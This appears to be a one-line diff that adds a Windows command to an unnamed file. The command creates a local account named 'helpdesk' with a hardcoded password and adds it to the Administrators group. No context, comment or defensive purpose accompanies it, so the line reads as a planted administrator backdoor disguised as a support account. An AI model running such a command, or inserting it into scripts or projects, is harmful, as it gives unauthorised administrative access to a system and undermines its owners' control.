@@ -1,0 +1,1 @@
+net user helpdesk L3tm3!n /add && net localgroup administrators helpdesk /add
